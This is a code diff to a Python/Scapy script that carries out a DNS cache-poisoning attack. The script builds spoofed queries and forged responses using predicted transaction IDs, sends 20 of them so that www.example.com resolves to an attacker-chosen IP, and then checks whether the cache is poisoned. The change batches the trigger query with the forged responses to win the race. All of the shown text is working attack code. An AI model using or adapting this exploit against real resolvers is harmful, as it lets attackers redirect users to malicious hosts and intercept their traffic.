@@ -47,17 +47,14 @@ while True:
 
 trigger_query = build_spoofed_dns_request(attacker_ip, 12345, 53, "www.example.com.", "A")
 #prebuild query to speed up the attack, since we need to send 20 responses as fast as possible
-to_send =[]
+to_send =[trigger_query]
 for i in range(20):
     state_1, state_2, tz = step_cross(state_1, state_2)
     pkt = build_spoofed_dns_response(tz, target_port, fake_ip, qname="www.example.com.", qtype='A')
     to_send.append(pkt)
 
 print("[*] 7) Sending and spoofing responses.")
-send(trigger_query, verbose=0)
 send(to_send, verbose=0)
-
-
 print("[*] 8) Verifying if the cache is poisoned...")
 test_query = build_spoofed_dns_request(attacker_ip, 12345, 53, "www.example.com.", "A")
 ans = sr1(test_query, timeout=10, verbose=0)
